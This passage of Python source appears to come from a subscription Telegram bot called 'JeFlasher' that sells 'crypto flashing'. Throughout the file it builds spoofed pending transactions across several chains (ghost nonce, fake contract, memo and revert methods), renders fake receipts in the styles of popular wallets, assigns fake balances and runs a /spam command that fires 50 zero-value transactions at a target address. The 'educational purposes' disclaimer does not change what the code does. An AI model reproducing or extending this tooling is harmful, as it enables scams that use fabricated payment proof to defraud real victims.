import os
import logging
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler, ChatMemberHandler
from dotenv import load_dotenv
from config import Config
from database import Database
from blockchain import BlockchainUtils
from encryption import Encryption
from screenshot import ScreenshotGenerator
import asyncio
from datetime import datetime, timedelta
from decimal import Decimal

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)
logger = logging.getLogger(__name__)

# Add console handler
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
logger.addHandler(console_handler)

# Bot configuration
BOT_TOKEN = Config.BOT_TOKEN
ADMIN_USER_ID = Config.ADMIN_USER_ID

ADMIN_GC_ID = -5204588091

# Subscription prices
SUBSCRIPTION_PRICES = Config.SUBSCRIPTION_PRICES
PAYMENT_WALLET_ADDRESS = Config.PAYMENT_WALLET_ADDRESS

# States for conversation handler
WAITING_FOR_KEY = 1
WAITING_FOR_SOL_KEY = 2
WAITING_FOR_POLYGON_KEY = 3
GIVEAWAY_IMAGE = 4
GIVEAWAY_PRIZE = 5
GIVEAWAY_WINNERS = 6
GIVEAWAY_CHANNEL = 7
GIVEAWAY_DURATION = 8

class JeFlasherBot:
    def __init__(self):
        self.db = Database()
        self.blockchain = BlockchainUtils()
        self.encryption = Encryption()
        self.screenshot_gen = ScreenshotGenerator()
        
    async def log_to_admin_gc(self, message: str):
        """Send log message to Admin GC"""
        try:
            await self.application.bot.send_message(
                chat_id=ADMIN_GC_ID,
                text=message,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to log to Admin GC: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        user_id = user.id
        username = user.username or user.first_name or "User"
        
        # Create user in database
        if self.db.create_user(user_id, username):
            # Notify admin about new user
            try:
                log_msg = f"🆕 *New User Started Bot*\n\nUser: @{username}\nID: `{user_id}`"
                if user_id != ADMIN_USER_ID:
                    await context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=log_msg,
                        parse_mode='Markdown'
                    )
                # Log to GC
                await self.log_to_admin_gc(log_msg)
            except Exception as e:
                logger.error(f"Failed to notify admin about new user: {e}")
        
        welcome_message = (
            f"🎉 Welcome to *JeFlasher*! 🎉\n\n"
            f"Hello {username}!\n\n"
            f"JeFlasher is a premium cryptocurrency flashing service that allows you to "
            f"create aesthetic pending transactions on the Ethereum, Polygon, and Solana blockchains.\n\n"
            f"Please select an option below:"
        )
        
        keyboard = [
            [InlineKeyboardButton("💎 Buy Subscription", callback_data='menu_buy')],
            [InlineKeyboardButton("⚡ Flash Tokens", callback_data='menu_flash')],
            [InlineKeyboardButton("📊 My Status", callback_data='menu_status')],
            [InlineKeyboardButton("⚙️ Settings", callback_data='menu_settings')],
            [InlineKeyboardButton("❓ Help", callback_data='menu_help'), InlineKeyboardButton("📞 Support", callback_data='menu_support')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_text = (
            "📖 *JeFlasher Help Guide*\n\n"
            "Here's how to use the bot effectively:\n\n"
            "1. *Get Started*:\n"
            "   • Click 'Buy Subscription' to choose a plan.\n"
            "   • Send the exact ETH amount to the wallet shown.\n"
            "   • Reply with the Transaction Hash to activate.\n\n"
            "2. *Configuration*:\n"
            "   • Go to Settings > Set Private Keys.\n"
            "   • Enter your ETH/Polygon key (Step 1).\n"
            "   • Enter your Solana key (Step 2).\n\n"
            "3. *How to Flash*:\n"
            "   • Click 'Flash Tokens' in the main menu.\n"
            "   • Select Token (USDT, ETH, SOL, etc.).\n"
            "   • Select Network (Ethereum, Polygon, Solana).\n"
            "   • Enter Target Address.\n"
            "   • Enter Amount.\n"
            "   • Choose Method & Speed.\n\n"
            "4. *Customization*:\n"
            "   • Use /settime <timezone> (e.g., gmt+1) to match your local time.\n"
            "   • Use /settheme <name> to change screenshot look (exodus, metamask, phantom).\n\n"
            "5. *Support*:\n"
            "   • Need help? Use /support <message> to contact admin.\n\n"
            "⚠️ *Disclaimer*: This tool is for educational purposes only."
        )
        if update.callback_query:
            await update.callback_query.edit_message_text(help_text, parse_mode='Markdown')
        else:
            await update.message.reply_text(help_text, parse_mode='Markdown')

    async def support_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /support command"""
        if not context.args:
            await update.message.reply_text("❌ Please provide a message. Usage: /support <your message>")
            return

        message = " ".join(context.args)
        user = update.effective_user
        
        try:
            # Send to admin
            msg_text = f"📩 *New Support Message*\n\nFrom: @{user.username or user.first_name} (ID: `{user.id}`)\n\n{message}"
            await context.bot.send_message(
                chat_id=ADMIN_USER_ID,
                text=msg_text,
                parse_mode='Markdown'
            )
            # Log to GC
            await self.log_to_admin_gc(msg_text)
            
            await update.message.reply_text("✅ Message sent to support! We will get back to you shortly.")
        except Exception as e:
            logger.error(f"Error sending support message: {e}")
            await update.message.reply_text("❌ Error sending message. Please try again later.")

    async def spam_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /spam command"""
        user_id = update.effective_user.id
        
        # Check subscription
        if user_id != ADMIN_USER_ID and not self.db.get_active_subscription(user_id):
            await update.message.reply_text("❌ You need an active subscription to use this feature.")
            return

        # Check key
        user = self.db.get_user(user_id)
        if not user or not user['private_key_encrypted']:
            await update.message.reply_text("❌ You need to set your private key first. Use /setkey.")
            return

        if not context.args:
            await update.message.reply_text("❌ Usage: /spam <target_address>\nSends 50x 0 ETH transactions with low fees.")
            return
            
        target_address = context.args[0]
        network = 'ETH' # Default to ETH
        
        if not self.blockchain.validate_address(target_address, network):
             await update.message.reply_text(f"❌ Invalid {network} address.")
             return
             
        status_msg = await update.message.reply_text(f"🚀 Starting spam attack on {target_address} (50x 0 ETH)...")
        
        # Get key
        encrypted_key = user.get('private_key_encrypted')
        private_key = self.encryption.decrypt(encrypted_key)
        
        # Run in executor
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None,
            lambda: self.blockchain.create_spam_transactions(
                private_key, target_address, network=network, count=50
            )
        )
        
        if result['success']:
            await status_msg.edit_text(
                f"✅ *Spam Complete!*\n\n"
                f"Sent: {result['count']} transactions\n"
                f"Target: `{result['target']}`\n"
                f"First Hash: `{result['first_hash']}`\n"
                f"Last Hash: `{result['last_hash']}`",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text(f"❌ Spam failed: {result.get('error')}")

    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        user_id = update.effective_user.id
        
        # Get user settings
        user = self.db.get_user(user_id)
        timezone = user.get('timezone', 'UTC') if user else 'UTC'
        theme = user.get('theme', 'exodus') if user else 'exodus'
        fake_balance = user.get('fake_balance', 0.0) if user else 0.0

        if user_id == ADMIN_USER_ID:
            status_text = (
                "✅ *Active Subscription (Admin)*\n\n"
                "Plan: Lifetime\n"
                "Expires: Never\n"
                f"Timezone: {timezone}\n"
                f"Theme: {theme}\n"
                f"Fake Balance: {fake_balance}\n"
            )
            await update.message.reply_text(status_text, parse_mode='Markdown')
            return

        subscription = self.db.get_active_subscription(user_id)
        
        if subscription:
            try:
                end_date = datetime.strptime(subscription['end_date'], '%Y-%m-%d %H:%M:%S')
            except ValueError:
                # Fallback if format is different (e.g. ISO with T)
                try:
                    end_date = datetime.fromisoformat(subscription['end_date'])
                except:
                    end_date = datetime.now() # Should not happen

            status_text = (
                f"✅ *Active Subscription*\n\n"
                f"Plan: {subscription['tier'].title()}\n"
                f"Expires: {end_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Timezone: {timezone}\n"
                f"Theme: {theme}\n"
            )
        else:
            status_text = (
                "❌ *No Active Subscription*\n\n"
                "Use /buy to purchase a subscription."
            )
            
        await update.message.reply_text(status_text, parse_mode='Markdown')

    async def buy(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /buy command"""
        keyboard = [
            [
                InlineKeyboardButton(f"Daily (${SUBSCRIPTION_PRICES['daily']})", callback_data='buy_daily'),
                InlineKeyboardButton(f"Weekly (${SUBSCRIPTION_PRICES['weekly']})", callback_data='buy_weekly')
            ],
            [
                InlineKeyboardButton(f"Monthly (${SUBSCRIPTION_PRICES['monthly']})", callback_data='buy_monthly')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "💎 *Select a Subscription Plan*:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel conversation"""
        context.user_data.pop('awaiting_amount', None)
        context.user_data.pop('awaiting_tx_hash', None)
        context.user_data.pop('pending_payment', None)
        context.user_data.pop('awaiting_target', None)
        context.user_data.pop('flash_token', None)
        context.user_data.pop('flash_network', None)
        context.user_data.pop('flash_target', None)
        
        await update.message.reply_text("🚫 Operation cancelled.")
        return ConversationHandler.END

    async def set_key_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start key setting process"""
        await update.message.reply_text(
            "🔐 *Set Private Keys (Step 1/3)*\n\n"
            "Please enter your **Ethereum (EVM)** private key.\n"
            "This will be used for ETH and Polygon (default).\n"
            "It will be encrypted and stored securely.\n\n"
            "⚠️ Send /cancel to abort.",
            parse_mode='Markdown'
        )
        return WAITING_FOR_KEY

    async def set_key_finish(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Finish ETH key setting, ask for SOL"""
        user_id = update.effective_user.id
        private_key = update.message.text.strip()
        
        # Allow 0x prefix and strip it
        if private_key.lower().startswith('0x'):
            private_key = private_key[2:]
            
        # Basic validation: 64 hex characters
        if len(private_key) != 64:
            # Try one more time to see if user pasted something else, but if it's not 64 chars hex, it's likely wrong for ETH
            # However, some might paste with spaces?
            private_key = private_key.replace(' ', '')
            if len(private_key) != 64:
                await update.message.reply_text("❌ Invalid private key format. It should be 64 hex characters. Please try again or /cancel.")
                return WAITING_FOR_KEY
            
        # Encrypt and save ETH key
        encrypted_key = self.encryption.encrypt(private_key)
        if self.db.update_user_private_key(user_id, encrypted_key):
            # Update wallet address from key
            try:
                account = self.blockchain.w3.eth.account.from_key(private_key)
                self.db.update_user_wallet(user_id, account.address)
                await update.message.reply_text("✅ Ethereum key saved!")
            except Exception as e:
                logger.error(f"Error deriving address: {e}")
                await update.message.reply_text("⚠️ Saved key but could not derive address.")

            # Next step: SOL
            await update.message.reply_text(
                "🔐 *Set Private Keys (Step 2/2)*\n\n"
                "Please enter your **Solana** private key (Base58).\n"
                "This is required for Solana transactions.",
                parse_mode='Markdown'
            )
            return WAITING_FOR_SOL_KEY
                
        else:
            await update.message.reply_text("❌ Error saving private key. Please try again.")
            return WAITING_FOR_KEY

    async def set_key_sol(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Save SOL key and finish"""
        user_id = update.effective_user.id
        private_key = update.message.text.strip()
        
        # Relaxed validation for Solana key
        # Accept Base58 string (usually ~88 chars) or JSON array or just a long string
        if len(private_key) < 10: 
            await update.message.reply_text("❌ Invalid Solana key format (too short). Please enter a valid Base58 private key or JSON array.")
            return WAITING_FOR_SOL_KEY

        encrypted_key = self.encryption.encrypt(private_key)
        if self.db.update_user_sol_key(user_id, encrypted_key):
            await update.message.reply_text("✅ Solana key saved!")
            
            # Automatically set Polygon key to ETH key
            user = self.db.get_user(user_id)
            eth_key_enc = user.get('private_key_encrypted')
            if eth_key_enc:
                self.db.update_user_polygon_key(user_id, eth_key_enc)
                await update.message.reply_text("✅ Automatically set Polygon key to match Ethereum key.")
            
            await update.message.reply_text("🎉 *Setup Complete!*")
            return ConversationHandler.END
        else:
            await update.message.reply_text("❌ Error saving Solana key. Try again.")
            return WAITING_FOR_SOL_KEY

    # set_key_polygon removed as per request

    async def set_time(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /settime command"""
        if not context.args:
            await update.message.reply_text("❌ Usage: /settime <timezone>\nExample: /settime gmt+1, /settime UTC, /settime US/Central")
            return
            
        timezone = context.args[0]
        user_id = update.effective_user.id
        
        if self.db.update_user_timezone(user_id, timezone):
            await update.message.reply_text(f"✅ Timezone set to: {timezone}")
        else:
            await update.message.reply_text("❌ Failed to set timezone.")

    async def set_theme(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /settheme command"""
        if not context.args:
            await update.message.reply_text("❌ Usage: /settheme <theme>\nAvailable themes: exodus, light, phantom, metamask, coinbase")
            return
            
        theme = context.args[0].lower()
        if theme not in ['exodus', 'light', 'phantom', 'metamask', 'coinbase']:
            await update.message.reply_text("❌ Invalid theme. Available: exodus, light, phantom, metamask, coinbase")
            return
            
        user_id = update.effective_user.id
        
        if self.db.update_user_theme(user_id, theme):
            await update.message.reply_text(f"✅ Theme set to: {theme}")
        else:
            await update.message.reply_text("❌ Failed to set theme.")

    async def givebal(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /givebal command (Admin only)"""
        user_id = update.effective_user.id
        if user_id != ADMIN_USER_ID:
            return

        if len(context.args) != 2:
            await update.message.reply_text("❌ Usage: /givebal <user_id> <amount>")
            return
            
        try:
            target_id = int(context.args[0])
            amount = float(context.args[1])
            
            if self.db.update_user_fake_balance(target_id, amount):
                await update.message.reply_text(f"✅ Set fake balance for user {target_id} to {amount}")
            else:
                await update.message.reply_text("❌ Failed to update balance.")
        except ValueError:
            await update.message.reply_text("❌ Invalid arguments.")

    async def flash(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /flash command"""
        user_id = update.effective_user.id
        
        # Check subscription
        if user_id != ADMIN_USER_ID and not self.db.get_active_subscription(user_id):
            await update.message.reply_text("❌ You need an active subscription to use this feature. Use /buy.")
            return

        # Check if key is set
        user = self.db.get_user(user_id)
        if not user or not user['private_key_encrypted']:
            await update.message.reply_text("❌ You need to set your private key first. Use /setkey.")
            return

        keyboard = [
            [
                InlineKeyboardButton("USDC", callback_data='flash_USDC'),
                InlineKeyboardButton("USDT", callback_data='flash_USDT'),
                InlineKeyboardButton("DAI", callback_data='flash_DAI')
            ],
            [
                InlineKeyboardButton("ETH", callback_data='flash_ETH'),
                InlineKeyboardButton("MATIC", callback_data='flash_MATIC'),
                InlineKeyboardButton("SOL", callback_data='flash_SOL')
            ],
            [
                InlineKeyboardButton("Uniswap (UNI)", callback_data='flash_UNI'),
                InlineKeyboardButton("Chainlink (LINK)", callback_data='flash_LINK')
            ],
            [
                InlineKeyboardButton("❌ Cancel", callback_data='cancel_action')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "⚡ *Select Token to Flash*:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    async def handle_payment_verification(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle payment verification"""
        tx_hash = update.message.text.strip()
        user_id = update.effective_user.id
        
        # Check if we are expecting a payment verification
        pending_payment = context.user_data.get('pending_payment')
        if not pending_payment:
            # If user just sends a hash without context, try to find pending payment or just reject
            # For simplicity, require /buy flow first
            await update.message.reply_text("❌ No pending payment found. Please use /buy to start a subscription.")
            return

        if not tx_hash.startswith('0x') or len(tx_hash) != 66:
            await update.message.reply_text(
                "❌ Invalid Transaction Hash format.\n"
                "It should start with '0x' and be 66 characters long.\n"
                "Please try again or use /cancel."
            )
            return

        status_msg = await update.message.reply_text("🔍 Verifying transaction on Ethereum network...")
        
        try:
            # Run verification in executor to avoid blocking
            loop = asyncio.get_running_loop()
            verification_result = await loop.run_in_executor(
                None,
                lambda: self.blockchain.verify_payment(
                    PAYMENT_WALLET_ADDRESS,
                    pending_payment['amount'],
                    tx_hash
                )
            )
            
            if verification_result['success']:
                # Check if this tx_hash is already used
                if self.db.get_subscription_by_tx(tx_hash):
                    await status_msg.edit_text("❌ This transaction hash has already been used for a subscription.")
                    return

                # Create subscription
                if self.db.create_subscription(
                    user_id, 
                    pending_payment['tier'], 
                    pending_payment['amount'], 
                    tx_hash
                ):
                    await status_msg.edit_text(
                        f"✅ *Payment Verified Successfully!*\n\n"
                        f"Plan: {pending_payment['tier'].title()}\n"
                        f"Amount: {pending_payment['amount']} ETH\n"
                        f"Expires: {(datetime.now() + timedelta(days={'daily': 1, 'weekly': 7, 'monthly': 30}[pending_payment['tier']])).strftime('%Y-%m-%d')}\n\n"
                        f"You can now use /flash to create transactions.",
                        parse_mode='Markdown'
                    )
                    # Clear pending payment
                    context.user_data.pop('pending_payment', None)
                    context.user_data['awaiting_tx_hash'] = False
                else:
                    await status_msg.edit_text("❌ Database error while activating subscription. Please contact support.")
            else:
                await status_msg.edit_text(
                    f"❌ Payment verification failed:\n{verification_result.get('error')}\n\n"
                    f"Please ensure you sent the correct amount to the correct address.\n"
                    f"You can try sending the hash again if the transaction just confirmed."
                )
                
        except Exception as e:
            logger.error(f"Payment verification error: {e}")
            await status_msg.edit_text(f"❌ An error occurred during verification: {str(e)}")

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        user_id = query.from_user.id
        
        # Main Menu Handlers
        if data == 'menu_buy':
            await self.buy(update, context)
        elif data == 'menu_flash':
            await self.flash(update, context)
        elif data == 'menu_status':
            await self.status(update, context)
        elif data == 'menu_settings':
            # Settings Submenu
            keyboard = [
                [InlineKeyboardButton("🔑 Set Private Keys", callback_data='settings_keys')],
                [InlineKeyboardButton("🕒 Set Timezone", callback_data='settings_timezone')],
                [InlineKeyboardButton("🎨 Set Theme", callback_data='settings_theme')],
                [InlineKeyboardButton("🔙 Back", callback_data='menu_main')]
            ]
            await query.edit_message_text("⚙️ *Settings*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        elif data == 'menu_help':
            await self.help_command(update, context)
        elif data == 'menu_support':
             await query.edit_message_text("📞 To contact support, please send a message using: /support <message>")
        elif data == 'menu_main':
            # Back to main menu
            welcome_message = (
                f"🎉 Welcome to *JeFlasher*! 🎉\n\n"
                f"Please select an option below:"
            )
            keyboard = [
                [InlineKeyboardButton("💎 Buy Subscription", callback_data='menu_buy')],
                [InlineKeyboardButton("⚡ Flash Tokens", callback_data='menu_flash')],
                [InlineKeyboardButton("📊 My Status", callback_data='menu_status')],
                [InlineKeyboardButton("⚙️ Settings", callback_data='menu_settings')],
                [InlineKeyboardButton("❓ Help", callback_data='menu_help'), InlineKeyboardButton("📞 Support", callback_data='menu_support')]
            ]
            await query.edit_message_text(welcome_message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            
        # Settings Actions
        elif data == 'settings_keys':
            # Need to start conversation, which is tricky from callback.
            # Best is to tell user to use command or try to switch context.
            # But ConversationHandler entry points are usually commands.
            # We can manually trigger it or just tell user.
            await query.edit_message_text("🔐 To set your keys, please send the command: /setkey")
        elif data == 'settings_timezone':
             await query.edit_message_text("🕒 To set timezone, use: /settime <timezone>\nExample: /settime gmt+1")
        elif data == 'settings_theme':
             await query.edit_message_text("🎨 To set theme, use: /settheme <theme>\nAvailable: exodus, light, phantom, metamask, coinbase")

        elif data.startswith('buy_'):
            tier = data.split('_')[1]
            usd_price = SUBSCRIPTION_PRICES[tier]
            
            # Calculate ETH amount
            try:
                eth_price = self.screenshot_gen.get_token_price('ETH')
                eth_amount = round(usd_price / eth_price, 5) # 5 decimals for precision
                
                # Add a small buffer or just use the calculated amount
                # Ensure it's not 0
                if eth_amount == 0: eth_amount = 0.001
                
            except Exception as e:
                logger.error(f"Error fetching ETH price: {e}")
                # Fallback if price fetch fails (assume ETH = $2000)
                eth_amount = round(usd_price / 2000, 5)

            # Store pending payment info
            context.user_data['pending_payment'] = {
                'tier': tier,
                'amount': eth_amount,
                'usd_amount': usd_price
            }
            context.user_data['awaiting_tx_hash'] = True
            
            payment_text = (
                f"💳 *Payment Required*\n\n"
                f"Plan: {tier.title()}\n"
                f"Price: ${usd_price}\n"
                f"Amount to Pay: `{eth_amount} ETH`\n\n"
                f"Please send exactly *{eth_amount} ETH* to the following address:\n"
                f"`{PAYMENT_WALLET_ADDRESS}`\n\n"
                f"⚠️ *IMPORTANT*:\n"
                f"1. Send only ETH on Ethereum Mainnet.\n"
                f"2. Send the exact amount shown above.\n"
                f"3. After sending, reply with the *Transaction Hash (TxHash)* to activate your subscription."
            )
            await query.edit_message_text(payment_text, parse_mode='Markdown')
            
        elif data == 'cancel_action':
            await query.message.edit_text("🚫 Action cancelled.")
            context.user_data.pop('flash_token', None)
            context.user_data.pop('flash_network', None)
            context.user_data.pop('flash_target', None)
            context.user_data.pop('flash_amount', None)
            context.user_data.pop('flash_method', None)
            context.user_data.pop('flash_speed', None)
            context.user_data.pop('awaiting_target', None)
            context.user_data.pop('awaiting_amount', None)
            return

        elif data.startswith('flash_'):
            token = data.split('_')[1]
            context.user_data['flash_token'] = token
            
            # Determine Network Options based on token
            # USDC/USDT/DAI -> ETH, POLYGON, METIS
            # ETH/UNI -> ETH (and Metis for UNI?)
            # MATIC -> POLYGON
            # SOL -> SOLANA
            # METIS -> METIS
            
            if token in ['USDC', 'USDT', 'DAI']:
                keyboard = [
                    [InlineKeyboardButton("Ethereum (ERC20)", callback_data='net_ETH')],
                    [InlineKeyboardButton("Polygon (MATIC)", callback_data='net_POLYGON')],
                    [InlineKeyboardButton("❌ Cancel", callback_data='cancel_action')]
                ]
                await query.edit_message_text(
                    f"Selected Token: {token}\nSelect Network:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            elif token == 'ETH':
                context.user_data['flash_network'] = 'ETH'
                context.user_data['awaiting_target'] = True
                await query.edit_message_text(f"Selected Token: {token} (Ethereum)\nEnter Target Address:\n(Type /cancel to abort)")
            elif token == 'UNI':
                keyboard = [
                    [InlineKeyboardButton("Ethereum (ERC20)", callback_data='net_ETH')],
                    [InlineKeyboardButton("Polygon", callback_data='net_POLYGON')],
                    [InlineKeyboardButton("❌ Cancel", callback_data='cancel_action')]
                    # Metis UNI not supported yet
                ]
                await query.edit_message_text(
                    f"Selected Token: {token}\nSelect Network:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            elif token == 'LINK':
                keyboard = [
                    [InlineKeyboardButton("Ethereum (ERC20)", callback_data='net_ETH')],
                    [InlineKeyboardButton("Polygon", callback_data='net_POLYGON')],
                    [InlineKeyboardButton("❌ Cancel", callback_data='cancel_action')]
                ]
                await query.edit_message_text(
                    f"Selected Token: {token}\nSelect Network:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            elif token == 'MATIC':
                context.user_data['flash_network'] = 'POLYGON'
                context.user_data['awaiting_target'] = True
                await query.edit_message_text(f"Selected Token: {token} (Polygon)\nEnter Target Address:\n(Type /cancel to abort)")
            elif token == 'SOL':
                context.user_data['flash_network'] = 'SOLANA'
                context.user_data['awaiting_target'] = True
                await query.edit_message_text(f"Selected Token: {token} (Solana)\nEnter Target Address:\n(Type /cancel to abort)")
            elif token == 'METIS':
                context.user_data['flash_network'] = 'METIS'
                context.user_data['awaiting_target'] = True
                await query.edit_message_text(f"Selected Token: {token} (Metis Andromeda)\nEnter Target Address:\n(Type /cancel to abort)")

        elif data.startswith('net_'):
            network = data.split('_')[1]
            context.user_data['flash_network'] = network
            context.user_data['awaiting_target'] = True
            token = context.user_data.get('flash_token')
            await query.edit_message_text(f"Selected: {token} on {network}\nEnter Target Address:\n(Type /cancel to abort)")
            
        elif data.startswith('method_'):
            method = data.split('_')[1]
            # method_standard handled by else
            
            method_names = {
                'spoof': "On-Chain (Confirmed)",
                'ghost': "Ghost (Future Nonce)",
                'standard': "Standard (Mempool)",
                'zero': "Zero Value + Memo", # zero_memo -> zero
                'fake': "Fake Contract", # fake_contract -> fake
                'revert': "Revert/OOG" # revert_oog -> revert
            }
            
            # Map callback data to internal method name
            if method == 'spoof':
                context.user_data['flash_method'] = 'data_spoof'
            elif method == 'ghost':
                context.user_data['flash_method'] = 'ghost'
            elif method == 'zero': # zero_memo
                context.user_data['flash_method'] = 'zero_memo'
            elif method == 'fake': # fake_contract
                context.user_data['flash_method'] = 'fake_contract'
            elif method == 'revert': # revert_oog
                context.user_data['flash_method'] = 'revert_oog'
            else:
                context.user_data['flash_method'] = 'standard'
            
            method_name = method_names.get(method, "Standard")
            if method == 'zero': method_name = method_names['zero']
            if method == 'fake': method_name = method_names['fake']
            if method == 'revert': method_name = method_names['revert']
            
            # Ask for Speed
            keyboard = [
                [InlineKeyboardButton("🚀 Superfast (Highest Fee)", callback_data='speed_superfast')],
                [InlineKeyboardButton("⚡ Fast (Higher Fee)", callback_data='speed_fast')],
                [InlineKeyboardButton("🐢 Slow (Lower Fee)", callback_data='speed_long')],
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel_action')]
            ]
            await query.edit_message_text(
                f"Method Selected: {method_name}\nSelect Transaction Speed:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        elif data.startswith('speed_'):
            speed = data.split('_')[1] # fast or long
            context.user_data['flash_speed'] = speed
            
            # Execute
            await self.execute_flash(update, context)

        elif data.startswith('join_giveaway_'):
            await self.join_giveaway(update, context)

    async def handle_flash_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
        """Handle flash target address input"""
        target_address = update.message.text.strip()
        network = context.user_data.get('flash_network', 'ETH')
        
        if not self.blockchain.validate_address(target_address, network):
            await update.message.reply_text(f"❌ Invalid {network} address. Please try again.")
            return False
            
        context.user_data['flash_target'] = target_address
        context.user_data['awaiting_amount'] = True
        
        await update.message.reply_text(
            f"Target Address: {target_address}\n"
            f"Please enter the amount to flash:"
        )
        return True

    async def handle_flash_amount(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
        """Handle flash amount input"""
        try:
            amount = float(update.message.text)
            context.user_data['flash_amount'] = amount
            
            # Ask for Method
            keyboard = [
                [InlineKeyboardButton("🔹 Method 1: Standard (Mempool)", callback_data='method_standard')],
                [InlineKeyboardButton("🔸 Method 2: On-Chain (Confirmed)", callback_data='method_spoof')],
                [InlineKeyboardButton("👻 Method 3: Ghost (Future Nonce)", callback_data='method_ghost')],
                [InlineKeyboardButton("📝 Method 4: Zero Value + Memo", callback_data='method_zero_memo')],
                [InlineKeyboardButton("🏭 Method 5: Fake Contract", callback_data='method_fake_contract')],
                [InlineKeyboardButton("❌ Method 6: Revert/OOG", callback_data='method_revert_oog')],
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel_action')]
            ]
            
            # Solana only has 3 methods
            if context.user_data.get('flash_network') == 'SOLANA':
                keyboard = [
                    [InlineKeyboardButton("🔹 Method 1: Standard (0 SOL)", callback_data='method_standard')],
                    [InlineKeyboardButton("📝 Method 2: Memo Spoof", callback_data='method_zero_memo')],
                    [InlineKeyboardButton("🏭 Method 3: Token Sim", callback_data='method_fake_contract')],
                    [InlineKeyboardButton("❌ Cancel", callback_data='cancel_action')]
                ]

            await update.message.reply_text(
                f"Amount: {amount}\nSelect Flashing Method:\n\n"
                f"⚠️ *Disclaimer*: Methods 2-6 are experimental. They may not be recognized by all wallets or may be flagged. Use at your own risk.",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            return True 
                
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Please enter a number.")
            return False # Retry

    async def execute_flash(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Execute the flash transaction after gathering all info"""
        # Get data
        token = context.user_data.get('flash_token')
        network = context.user_data.get('flash_network')
        target_address = context.user_data.get('flash_target')
        amount = context.user_data.get('flash_amount')
        speed = context.user_data.get('flash_speed')
        flash_method = context.user_data.get('flash_method', 'standard')
        user_id = update.effective_user.id
        
        # Get user key based on network
        user = self.db.get_user(user_id)
        
        encrypted_key = None
        if network == 'SOLANA':
            encrypted_key = user.get('sol_private_key_encrypted')
        elif network == 'POLYGON':
            # Use specific polygon key if exists, else fallback to ETH key
            encrypted_key = user.get('polygon_private_key_encrypted')
            if not encrypted_key:
                encrypted_key = user.get('private_key_encrypted')
        else: # ETH, etc.
            encrypted_key = user.get('private_key_encrypted')

        if not encrypted_key:
            await context.bot.send_message(chat_id=user_id, text=f"❌ No private key found for {network}. Please use /setkey.")
            return

        private_key = self.encryption.decrypt(encrypted_key)
        
        # Get user theme and timezone
        theme = user.get('theme', 'exodus')
        timezone = user.get('timezone', 'UTC')
        
        if not private_key:
            await context.bot.send_message(chat_id=user_id, text="❌ Error decrypting key. Please set it again.")
            return

        status_msg = await context.bot.send_message(chat_id=user_id, text="⚡ Initiating flash transaction...")
        
        # Run in executor
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None, 
            lambda: self.blockchain.create_flash_transaction(
                private_key, token, amount, target_address, mode=speed, network=network, flash_method=flash_method
            )
        )
        
        if result['success']:
            # Save to history
            self.db.add_flash_history(
                user_id, token, amount, speed, 
                result['tx_hash'], result['from_address'], 
                target_address, 'success'
            )
            
            explorer_url = self.blockchain.get_explorer_url(result['tx_hash'], network)
            
            success_text = (
                f"✅ *Flash Successful!*\n\n"
                f"Token: {token} ({network})\n"
                f"Amount: {amount}\n"
                f"Target: `{target_address}`\n"
                f"TX Hash: `{result['tx_hash']}`\n"
                f"[View on Explorer]({explorer_url})"
            )
            await status_msg.edit_text(success_text, parse_mode='Markdown')
            
            # Generate and send screenshot
            try:
                await context.bot.send_message(chat_id=user_id, text="📸 Generating transaction receipt...")
                screenshot_path = await loop.run_in_executor(
                    None,
